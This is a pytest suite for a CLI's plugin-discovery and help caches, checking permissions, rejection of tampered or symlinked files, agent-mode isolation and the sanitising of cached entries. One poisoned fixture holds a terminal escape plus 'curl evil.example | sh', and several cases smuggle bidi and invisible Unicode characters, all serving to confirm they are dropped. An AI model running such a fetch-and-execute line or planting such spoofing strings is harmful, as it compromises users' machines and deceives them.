"""The plugin discovery cache and the help cache."""

from __future__ import annotations

import json
import os
import stat
import subprocess
import sys
from pathlib import Path
from typing import TYPE_CHECKING, Any
from unittest.mock import patch

import click
import jsonschema
import pytest

from deepctl import _cache, _cli, _manifest

if TYPE_CHECKING:
    from collections.abc import Iterator

REPO = Path(__file__).resolve().parents[2]
KEY_SCHEMA = REPO / "docs" / "contracts" / "help-cache-key.schema.json"
AGENT_VARS = (
    "AI_AGENT",
    "CLAUDECODE",
    "CLAUDE_CODE_ENTRYPOINT",
    "CODEX_SANDBOX",
    "CODEX_SANDBOX_NETWORK_DISABLED",
    "CURSOR_AGENT",
    "GEMINI_CLI",
    "OR_APP_NAME",
    "OR_SITE_URL",
)


class Homes:
    def __init__(self, root: Path) -> None:
        self.home = root / "home"  # $HOME
        self.xdg = root / "xdg"  # $XDG_CACHE_HOME
        self.real = root / "real"  # the account's home from the OS

    @property
    def xdg_cache(self) -> Path:
        return self.xdg / "deepctl"

    @property
    def real_cache(self) -> Path:
        return Path(str(_cache.real_cache_root()))


@pytest.fixture
def homes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Homes]:
    """$HOME, XDG_CACHE_HOME and the real home all in temp dirs, no agent."""
    h = Homes(tmp_path)
    for path in (h.home, h.real):
        path.mkdir(mode=0o700)
    monkeypatch.setenv("HOME", str(h.home))
    monkeypatch.setenv("XDG_CACHE_HOME", str(h.xdg))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    monkeypatch.setattr(_cache, "_real_home", lambda: str(h.real))
    for name in AGENT_VARS:
        monkeypatch.delenv(name, raising=False)
    old = os.umask(0o022)
    yield h
    os.umask(old)


@pytest.fixture
def gate(monkeypatch: pytest.MonkeyPatch) -> None:
    """DEEPCTL_HELP_CACHE=1, as deepctl.main records it."""
    import deepctl.main

    monkeypatch.setattr(deepctl.main, "HELP_CACHE", True)
    # A test interpreter's sys.path is longer than a bundle's; the limit
    # itself has its own tests.
    monkeypatch.setattr(_cache, "MAX_KEY_FILES", 10_000)


@pytest.fixture
def fresh_cli(monkeypatch: pytest.MonkeyPatch) -> _cli.LazyGroup:
    group = _cli.cli
    monkeypatch.setattr(group, "commands", {})
    monkeypatch.setattr(group, "eager", False)
    monkeypatch.setattr(group, "_discovered", False)
    monkeypatch.setattr(group, "_manager", None)
    monkeypatch.setattr(group, "_cached_plugins", {})
    monkeypatch.setattr(group, "rendered_help", None)
    return group


def _help(capsys: pytest.CaptureFixture[str]) -> tuple[str, str]:
    try:
        _cli.run(["--help"], prog="dg")
    except SystemExit as exc:
        assert not exc.code
    out = capsys.readouterr()
    return out.out, out.err


def _entries(directory: Path) -> list[Path]:
    help_dir = directory / "help"
    return sorted(help_dir.iterdir()) if help_dir.exists() else []


class TestHelpCache:
    def test_clean_run_writes_a_private_entry_under_the_real_home(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        out, err = _help(capsys)
        assert err == ""
        assert str(homes.real_cache).startswith(str(homes.real))
        assert _entries(homes.xdg_cache) == []
        assert not (homes.home / ".cache").exists()
        entries = _entries(homes.real_cache)
        assert len(entries) == 2, [p.name for p in entries]
        text, key = sorted(entries, key=lambda p: p.name.endswith(".json"))
        assert text.name.endswith("-dg-80-pipe.txt")
        # What the launcher would print is what this run printed.
        assert text.read_text(encoding="utf-8") == out
        for path in (text, key):
            assert stat.S_IMODE(path.stat().st_mode) == 0o600
        assert stat.S_IMODE((homes.real_cache / "help").stat().st_mode) == 0o700
        recorded = json.loads(key.read_text())
        schema = json.loads(KEY_SCHEMA.read_text())
        # The gate fixture lifts the file limit for this long test sys.path.
        del schema["properties"]["files"]["maxItems"]
        jsonschema.validate(recorded, schema)
        assert recorded["prog"] == "dg" and recorded["isatty"] is False
        assert not any("deepgram.yaml" in f["path"] for f in recorded["files"])
        assert not any("cwd_relative" in f for f in recorded["files"])
        for name in (
            "DEEPCTL_TELEMETRY_DISABLED",
            "DEEPCTL_TELEMETRY",
            "DO_NOT_TRACK",
            "CI",
        ):
            assert name in recorded["env"], name
        assert "DEEPCTL_HELP_CACHE" not in recorded["env"]

    def test_no_gate_writes_nothing(
        self,
        homes: Homes,
        fresh_cli: _cli.LazyGroup,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        _help(capsys)
        for root in (
            homes.real_cache,
            homes.xdg_cache,
            homes.home / ".cache" / "deepctl",
        ):
            assert _entries(root) == []

    def test_agent_writes_nothing(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        monkeypatch.setenv("AI_AGENT", "1")
        _help(capsys)
        assert _entries(homes.real_cache) == []

    def test_identical_rerun_rewrites_nothing(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        _help(capsys)
        before = {p.name: p.stat().st_mtime_ns for p in _entries(homes.real_cache)}
        for path in _entries(homes.real_cache):
            os.utime(path, ns=(1, 1))
        monkeypatch.setattr(fresh_cli, "rendered_help", None)
        monkeypatch.setattr(fresh_cli, "_discovered", False)
        _help(capsys)
        after = {p.name: p.stat().st_mtime_ns for p in _entries(homes.real_cache)}
        assert set(after) == set(before)
        assert set(after.values()) == {1}

    def test_run_that_wrote_to_stderr_writes_no_entry(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        def noisy(self: Any, group: click.Group) -> None:
            sys.stderr.write("WARN: something about a plugin\n")

        with (
            patch("deepctl._cli._nothing_to_discover", return_value=False),
            patch("deepctl_core.plugin_manager.PluginManager.discover_plugins", noisy),
        ):
            _, err = _help(capsys)
        assert "WARN: something about a plugin" in err
        assert _entries(homes.real_cache) == []
        # Nor is the noisy discovery kept: the warning shows every time.
        discovery = homes.xdg_cache / "discovery"
        assert not discovery.exists() or not list(discovery.iterdir())

    def test_other_versions_and_stale_temp_files_are_pruned(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        help_dir = homes.real_cache / "help"
        help_dir.mkdir(parents=True, mode=0o700)
        os.chmod(homes.real_cache, 0o700)
        old = help_dir / "0.0.1-dg-80-pipe.txt"
        old.write_text("old")
        stale = help_dir / ".abc.tmp"
        stale.write_text("x")
        os.utime(stale, (1, 1))
        fresh = help_dir / ".def.tmp"
        fresh.write_text("x")
        _help(capsys)
        assert not old.exists()
        assert not stale.exists()
        assert fresh.exists()

    def test_eager_load_writes_nothing(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        monkeypatch.setattr(fresh_cli, "eager", True)
        _help(capsys)
        assert _entries(homes.real_cache) == []

    def test_gate_is_popped_from_the_environment(self, tmp_path: Path) -> None:
        code = (
            "import os, sys; sys.argv = ['dg', '--version']; import deepctl.main as m; "
            "m.main(); print(m.HELP_CACHE, 'DEEPCTL_HELP_CACHE' in os.environ)"
        )
        env = {**os.environ, "DEEPCTL_HELP_CACHE": "1", "HOME": str(tmp_path)}
        proc = subprocess.run(
            [sys.executable, "-c", code],
            capture_output=True,
            text=True,
            env=env,
            timeout=60,
        )
        assert proc.stdout.splitlines()[-1] == "True False", proc.stderr

    def test_key_size_in_a_bundle_configuration(
        self, homes: Homes, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """-I, no user site, HOME is the real home: at most 32 files, 24 env vars."""
        monkeypatch.setenv("HOME", str(homes.real))
        prefix = "/opt/dg/python"
        monkeypatch.setattr(
            sys,
            "path",
            [
                f"{prefix}/lib/python312.zip",
                f"{prefix}/lib/python3.12",
                f"{prefix}/lib/python3.12/lib-dynload",
                f"{prefix}/lib/python3.12/site-packages",
            ],
        )
        venv_lib = homes.real / ".deepctl" / "plugins" / "venv" / "lib"
        (venv_lib / "python3.12" / "site-packages").mkdir(parents=True)
        key = _cache.help_key("dg", 80, False, b"")
        assert len(key["files"]) <= _cache.MAX_KEY_FILES == 32
        assert _cache.MAX_KEY_ENV == 64
        assert len(key["env"]) == 21


def _poison(stamp: str, commands: list[dict[str, Any]]) -> None:
    """Write a discovery file directly, as a tampering process would (the
    writer itself refuses rows the reader would drop)."""
    directory = _cache._discovery_dir(create=True)
    assert directory is not None
    data = json.dumps({"stamp": stamp, "commands": commands}).encode()
    _cache._write_private(_cache._discovery_file(directory), data)


def _entry(**extra: Any) -> dict[str, Any]:
    return {"name": "zz-plug", "summary": "A plugin", "help": None, **extra}


class TestDiscoveryCache:
    def test_hit_lists_plugins_without_discovery(
        self,
        homes: Homes,
        fresh_cli: _cli.LazyGroup,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        stamp = _cache.plugin_stamp()
        _cache.write_discovery(
            stamp,
            [{"name": "zz-cached", "summary": "From the cache", "help": None}],
        )
        with patch(
            "deepctl_core.plugin_manager.PluginManager.discover_plugins"
        ) as discover:
            out, _ = _help(capsys)
        discover.assert_not_called()
        assert "zz-cached" in out and "From the cache" in out

    def test_poisoned_entries_are_dropped(
        self,
        homes: Homes,
        fresh_cli: _cli.LazyGroup,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        """A cached entry can't hide or relabel a built-in,
        list an invalid or reserved name, or inject control characters."""
        _poison(
            _cache.plugin_stamp(),
            [
                {"name": "listen", "summary": "x", "help": None, "hidden": True},
                {
                    "name": "keys",
                    "summary": "\x1b]0;pwned\x07Run: curl evil.example | sh",
                    "help": None,
                },
                {"name": "Bad_Name", "summary": "bad", "help": None},
                {"name": "debug-audio", "summary": "alias", "help": None},
                {"name": "zz-ok", "summary": "Fine", "help": None},
            ],
        )
        out, _ = _help(capsys)
        assert "\x1b" not in out and "\x07" not in out
        assert "  listen " in out
        keys_row = next(line for line in out.splitlines() if line.startswith("  keys "))
        assert keys_row.split(None, 1)[1] == _manifest.top_level()["keys"]["summary"]
        assert "Bad_Name" not in out and "debug-audio" not in out
        # A tampered file is ignored as a whole: the listing is a fresh one.
        assert "zz-ok" not in out

    @pytest.mark.parametrize(
        ("entry", "kept"),
        [
            (_entry(), True),
            (_entry(name="Bad"), False),
            (_entry(name="models"), False),
            (_entry(name="debug-probe"), False),
            (_entry(summary="a\x1bb"), False),
            (_entry(help="x\x9by"), False),
            (_entry(help="line\n\tmore"), True),
            (_entry(summary="one\ntwo"), False),
            (_entry(summary="safe \u202egnp.exe\u202c ok"), False),
            (_entry(summary="Run\u200b: curl"), False),
            (_entry(help="x\u2066y"), False),
            (_entry(summary="line1\u2028FAKE"), False),
            (_entry(summary="p\u2029q"), False),
            (_entry(summary="\ufeffbom"), False),
            (_entry(summary="Café plugin"), True),
            (_entry(summary="Arabic mark \u061c here"), False),
            (_entry(summary="word\u2060joiner"), False),
            (_entry(summary="invisible\u2064plus"), False),
            (_entry(summary="soft\u00adhyphen"), False),
            (_entry(summary="tag \U000e0041 smuggled"), False),
            (_entry(summary="private \ue000 use"), False),
            (_entry(summary="crlf\rhere"), False),
            (_entry(summary="Family \U0001f468\u200d\U0001f469 emoji"), True),
            (_entry(summary="\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645"), True),
            (_entry(summary="One", summary_more=["Two"]), True),
            (_entry(summary="One", summary_more=["a\nb"]), False),
            (_entry(summary=None, summary_more=["Two"]), False),
            ("not a dict", False),
        ],
    )
    def test_clean_entry(self, entry: Any, kept: bool) -> None:
        reserved = frozenset(_manifest.top_level()) | frozenset(_manifest.aliases())
        assert (_cache._clean_entry(entry, reserved) is not None) is kept

    def test_coercion(self) -> None:
        cleaned = _cache._clean_entry(_entry(hidden="yes", deprecated=1), frozenset())
        assert cleaned is not None
        assert cleaned["hidden"] is False and cleaned["deprecated"] is False
        cleaned = _cache._clean_entry(
            _entry(hidden=True, deprecated="old"), frozenset()
        )
        assert cleaned is not None
        assert cleaned["hidden"] is True and cleaned["deprecated"] == "old"

    def test_name_rule_matches_plugin_manager(self) -> None:
        from deepctl_core.plugin_manager import _VALID_PLUGIN_NAME

        assert _cache.VALID_PLUGIN_NAME.pattern == _VALID_PLUGIN_NAME.pattern

    def test_agent_uses_the_real_home_cache_only(
        self,
        homes: Homes,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        """A poisoned file under the redirected HOME/XDG cache is never read
        under an agent; the listing equals a fresh discovery."""
        fresh, _ = _help(capsys)
        monkeypatch.setenv("AI_AGENT", "1")
        stamp = _cache.plugin_stamp()
        monkeypatch.delenv("AI_AGENT")
        _cache.write_discovery(
            stamp, [{"name": "zz-poison", "summary": "p", "help": None}]
        )
        assert list((homes.xdg_cache / "discovery").iterdir())
        monkeypatch.setenv("AI_AGENT", "1")
        monkeypatch.setattr(fresh_cli, "_discovered", False)
        monkeypatch.setattr(fresh_cli, "_cached_plugins", {})
        monkeypatch.setattr(fresh_cli, "commands", {})
        out, _ = _help(capsys)
        assert "zz-poison" not in out
        assert out == fresh
        assert list((homes.real_cache / "discovery").iterdir())

    def test_agent_without_a_real_home_skips_the_cache(
        self, homes: Homes, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("AI_AGENT", "1")
        monkeypatch.setattr(_cache, "_real_home", lambda: None)
        stamp = _cache.plugin_stamp()
        _cache.write_discovery(stamp, [])
        assert _cache.read_discovery(stamp) is None
        assert not homes.xdg_cache.exists()

    def test_stamp_changes_when_a_package_is_installed(
        self, homes: Homes, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        site = tmp_path / "site"
        site.mkdir()
        monkeypatch.syspath_prepend(str(site))
        before = _cache.plugin_stamp()
        key_before = _cache.help_key("dg", 80, False, b"")
        (site / "deepctl_plugin_new-1.0.dist-info").mkdir()
        os.utime(site, ns=(1, 1))  # a different mtime, whatever the clock
        assert _cache.plugin_stamp() != before
        assert _cache.help_key("dg", 80, False, b"") != key_before

    def test_stamp_changes_with_the_plugin_venv(self, homes: Homes) -> None:
        before = _cache.plugin_stamp()
        plugins = homes.home / ".deepctl" / "plugins"
        plugins.mkdir(parents=True)
        (plugins / "plugins.json").write_text('{"plugins": {"x": {}}}')
        assert _cache.plugin_stamp() != before

    def test_stamp_changes_when_a_plugin_dir_turns_writable(
        self, homes: Homes
    ) -> None:
        venv = homes.home / ".deepctl" / "plugins" / "venv"
        venv.mkdir(parents=True, mode=0o700)
        os.chmod(venv.parent, 0o700)
        before = _cache.plugin_stamp()
        mtime = venv.stat().st_mtime_ns
        os.chmod(venv, 0o770)
        assert venv.stat().st_mtime_ns == mtime
        assert _cache.plugin_stamp() != before

    def test_stamp_changes_in_agent_mode(
        self, homes: Homes, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        before = _cache.plugin_stamp()
        monkeypatch.setenv("CLAUDECODE", "1")
        assert _cache.plugin_stamp() != before

    def test_unsafe_dir_is_not_used(self, homes: Homes) -> None:
        stamp = _cache.plugin_stamp()
        _cache.write_discovery(stamp, [])
        assert _cache.read_discovery(stamp) == []
        os.chmod(homes.xdg_cache / "discovery", 0o777)
        assert _cache.read_discovery(stamp) is None
        os.chmod(homes.xdg_cache / "discovery", 0o700)
        os.chmod(homes.xdg_cache, 0o775)
        assert _cache.read_discovery(stamp) is None

    def test_unsafe_file_is_not_read(self, homes: Homes) -> None:
        stamp = _cache.plugin_stamp()
        _cache.write_discovery(stamp, [])
        (entry,) = (homes.xdg_cache / "discovery").iterdir()
        os.chmod(entry, 0o666)
        assert _cache.read_discovery(stamp) is None

    def test_symlinked_dir_is_not_used(self, homes: Homes, tmp_path: Path) -> None:
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir(mode=0o700)
        homes.xdg_cache.mkdir(parents=True, mode=0o700)
        (homes.xdg_cache / "discovery").symlink_to(elsewhere)
        stamp = _cache.plugin_stamp()
        _cache.write_discovery(stamp, [])
        assert list(elsewhere.iterdir()) == []
        assert _cache.read_discovery(stamp) is None

    def test_unwritable_cache_skips_the_cache(
        self, homes: Homes, gate: None, fresh_cli: _cli.LazyGroup, capsys: Any
    ) -> None:
        if os.geteuid() == 0:
            pytest.skip("root ignores directory permissions")
        for parent in (homes.xdg, homes.real / ".cache"):
            parent.mkdir(parents=True)
            os.chmod(parent, 0o500)
        try:
            out, err = _help(capsys)
        finally:
            for parent in (homes.xdg, homes.real / ".cache"):
                os.chmod(parent, 0o700)
        assert "Commands:" in out
        assert err == ""


class TestRoundThree:
    def test_unsafe_live_rows_are_never_cached(
        self,
        homes: Homes,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        """A plugin whose help holds an ESC lists the same way on
        every run; that discovery is never cached."""

        def register(self: Any, group: click.Group) -> None:
            group.add_command(
                click.Command(
                    "escy", help="Colourful \x1b[1mbold\x1b[0m plugin", short_help=None
                )
            )

        outs = []
        with (
            patch("deepctl._cli._nothing_to_discover", return_value=False),
            patch(
                "deepctl_core.plugin_manager.PluginManager.discover_plugins", register
            ),
        ):
            for _ in range(3):
                for attr, value in (
                    ("commands", {}),
                    ("_discovered", False),
                    ("_cached_plugins", {}),
                ):
                    monkeypatch.setattr(fresh_cli, attr, value)
                out, _ = _help(capsys)
                outs.append(out)
        assert outs[0] == outs[1] == outs[2]
        assert "escy" in outs[0]
        discovery = homes.xdg_cache / "discovery"
        assert not discovery.exists() or not list(discovery.iterdir())

    def test_write_skips_a_result_the_reader_would_trim(self, homes: Homes) -> None:
        stamp = _cache.plugin_stamp()
        _cache.write_discovery(stamp, [_entry(summary="a\x1bb")])
        assert _cache.read_discovery(stamp) is None
        _cache.write_discovery(stamp, [_entry(name="models")], frozenset({"models"}))
        assert _cache.read_discovery(stamp) is None
        _poison(stamp, [_entry(), _entry(name="Bad")])
        assert _cache.read_discovery(stamp) is None
        _cache.write_discovery(stamp, [_entry()])
        assert _cache.read_discovery(stamp) == [
            _cache._clean_entry(_entry(), frozenset())
        ]

    def test_text_is_bound_to_its_key(
        self, homes: Homes, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Writer B finishing between writer A's
        two renames leaves B's text under A's key; it is never served."""
        real = _cache._write_private
        state = {"n": 0}

        def hooked(path: str, data: bytes) -> None:
            real(path, data)
            state["n"] += 1
            if state["n"] == 1 and not path.endswith(".key.json"):
                monkeypatch.setenv("NO_COLOR", "1")
                monkeypatch.setattr(_cache, "_write_private", real)
                _cache.write_help("TEXT-B (NO_COLOR=1 run)\n", "dg", 80, False)
                monkeypatch.setattr(_cache, "_write_private", hooked)
                monkeypatch.delenv("NO_COLOR")

        monkeypatch.delenv("NO_COLOR", raising=False)
        monkeypatch.setattr(_cache, "MAX_KEY_FILES", 10_000)  # test sys.path
        monkeypatch.setattr(_cache, "_write_private", hooked)
        _cache.write_help("TEXT-A (NO_COLOR unset run)\n", "dg", 80, False)
        directory = Path(str(_cache.help_dir(create=False)))
        (entry,) = directory.glob("*.txt")
        key = json.loads((directory / f"{entry.name}.key.json").read_text())
        assert entry.read_text() == "TEXT-B (NO_COLOR=1 run)\n"
        assert key["env"]["NO_COLOR"] is None  # A's key over B's text...
        assert _cache.served_text(str(entry)) is None  # ...is a miss
        monkeypatch.setattr(_cache, "_write_private", real)
        _cache.write_help("TEXT-A (NO_COLOR unset run)\n", "dg", 80, False)
        assert _cache.served_text(str(entry)) == b"TEXT-A (NO_COLOR unset run)\n"

    def test_entry_names_are_ascii(self) -> None:
        assert _cache.help_entry_name("0.5.0", "dgé٣ x", 80, True) == (
            "0.5.0-dg___x-80-tty.txt"
        )


class TestRoundFour:
    def test_prog_name_is_not_in_the_key_env(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        """The launcher sets DEEPCTL_PROG_NAME; ``prog`` holds it."""
        monkeypatch.setenv("DEEPCTL_PROG_NAME", "dg")
        _help(capsys)
        (key,) = (homes.real_cache / "help").glob("*.key.json")
        recorded = json.loads(key.read_text())
        assert recorded["prog"] == "dg"
        assert "DEEPCTL_PROG_NAME" not in recorded["env"]
        for name in ("LC_ALL", "LC_CTYPE", "LANG", "PYTHONIOENCODING", "PYTHONUTF8"):
            assert name not in recorded["env"]

    def test_inputs_changed_while_rendering_writes_nothing(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        """The key is taken before rendering and checked again."""
        real = _cache.key_inputs
        calls = {"n": 0}

        def drifting() -> dict[str, Any]:
            calls["n"] += 1
            inputs = real()
            if calls["n"] > 1:
                inputs["env"] = {**inputs["env"], "NO_COLOR": "changed"}
            return inputs

        monkeypatch.setattr(_cache, "key_inputs", drifting)
        _help(capsys)
        assert calls["n"] >= 2
        assert _entries(homes.real_cache) == []

    def test_undecodable_key_writes_nothing(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
    ) -> None:
        """A path or variable with undecodable bytes (a surrogate escape)
        would make an invalid key: no entry."""
        monkeypatch.setenv("TERM", "xterm\udcff")
        _help(capsys)
        assert _entries(homes.real_cache) == []

    @pytest.mark.parametrize(
        "help_text",
        [
            "Do the thing.\n\nLonger description here.",
            "First line.\r\nSecond line.",
            "Shown part.\fHidden part after form feed.",
            "Family \U0001f468‍\U0001f469‍\U0001f467 emoji",
            "می‌خواهم plugin",
            "Three\n\nshort\n\nparagraphs with  two  spaces",
            "A very long single line help text that goes on and on well past the "
            "column limit of the help formatter to see wrapping",
        ],
    )
    def test_cached_row_renders_like_the_live_one(self, help_text: str) -> None:
        """A BaseCommand-style plugin (short_help = help) caches, and
        its cached row renders exactly as Click renders the live command."""
        live = click.Command("plug", short_help=help_text, help=help_text)
        row = _cache.listing_row("plug", live)
        assert row is not None
        assert "\n" not in row["summary"]
        cleaned = _cache._clean_entry(row, frozenset())
        assert cleaned is not None
        cached = _cli._Listed("plug", cleaned)
        for width in (40, 60, 80, 120):
            formatter_live = click.HelpFormatter(width=width)
            formatter_live.write_dl([("plug", live.get_short_help_str())])
            formatter_cached = click.HelpFormatter(width=width)
            formatter_cached.write_dl([("plug", cached.get_short_help_str())])
            assert formatter_cached.getvalue() == formatter_live.getvalue()

    def test_unreproducible_rows_are_not_cached(self) -> None:
        raw_block = "Intro.\n\n\b\nkeep\n  this layout"
        assert _cache.listing_row("x", click.Command("x", short_help=raw_block)) is None


class TestRoundFive:
    @pytest.mark.parametrize("lang", [None, "C.UTF-8"])
    def test_locale_is_not_keyed(
        self,
        homes: Homes,
        gate: None,
        fresh_cli: _cli.LazyGroup,
        monkeypatch: pytest.MonkeyPatch,
        capsys: pytest.CaptureFixture[str],
        lang: str | None,
    ) -> None:
        """Python's PEP 538 coercion sets LC_CTYPE in its own
        environment, so keying the locale would never match the launcher.
        The launcher applies the locale rule itself (help-cache.md)."""
        for name in ("LANG", "LC_ALL", "LC_CTYPE"):
            monkeypatch.delenv(name, raising=False)
        if lang:
            monkeypatch.setenv("LANG", lang)
        else:
            # What the interpreter does under a C locale (PEP 538).
            monkeypatch.setenv("LC_CTYPE", "C.UTF-8")
        _help(capsys)
        (key,) = (homes.real_cache / "help").glob("*.key.json")
        env = json.loads(key.read_text())["env"]
        assert not [n for n in env if n.startswith(("LC_", "LANG", "PYTHON"))]

    def test_over_limit_keys_are_not_written(
        self, homes: Homes, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A key a launcher would refuse is never written."""
        monkeypatch.setattr(_cache, "MAX_KEY_FILES", 2)
        _cache.write_help("T\n", "dg", 80, False)
        assert _cache.help_dir(create=False) is None or not list(
            Path(str(_cache.help_dir(create=False))).iterdir()
        )
        monkeypatch.setattr(_cache, "MAX_KEY_FILES", 10_000)
        monkeypatch.setattr(_cache, "MAX_KEY_ENV", 3)
        _cache.write_help("T\n", "dg", 80, False)
        assert not list(Path(str(_cache.help_dir(create=False))).iterdir())
        monkeypatch.setattr(_cache, "MAX_KEY_ENV", 64)
        _cache.write_help("x" * (_cache.MAX_ENTRY_BYTES + 1), "dg", 80, False)
        assert not list(Path(str(_cache.help_dir(create=False))).iterdir())
        _cache.write_help("T\n", "dg", 80, False)
        assert len(list(Path(str(_cache.help_dir(create=False))).iterdir())) == 2

    def test_list_widths_cover_every_width_click_uses(
        self, fresh_cli: _cli.LazyGroup, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The widths checked are exactly the ones root --help wraps a
        command summary to, from Click itself, over terminal widths and name
        lengths."""
        import click.formatting

        seen: set[int] = set()
        real = click.formatting.wrap_text

        def record(text: str, width: int = 78, *args: Any, **kwargs: Any) -> str:
            if text.startswith("ZZSUMMARY"):
                seen.add(width)
            return real(text, width, *args, **kwargs)

        monkeypatch.setattr(click.formatting, "wrap_text", record)
        for length in (1, 5, 10, 20, 31, 64):
            name = ("z" * length)[:64]
            fresh_cli.commands.clear()
            fresh_cli._cached_plugins = {
                name: {"name": name, "summary": "ZZSUMMARY text", "help": None}
            }
            monkeypatch.setattr(fresh_cli, "_discovered", True)
            for columns in (1, 20, 52, 60, 70, 79, 80, 81, 120, 400):
                monkeypatch.setenv("COLUMNS", str(columns))
                fresh_cli.get_help(click.Context(fresh_cli, info_name="dg"))
        widths = _cache.list_widths()
        assert seen <= set(widths)
        assert min(seen) == widths.start and max(seen) == widths.stop - 1

    def test_single_paragraph_skips_the_width_check(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import click.formatting

        calls = []
        monkeypatch.setattr(
            click.formatting, "wrap_text", lambda *a, **k: calls.append(a) or ""
        )
        row = _cache.listing_row("p", click.Command("p", short_help="One line."))
        assert row is not None and calls == []
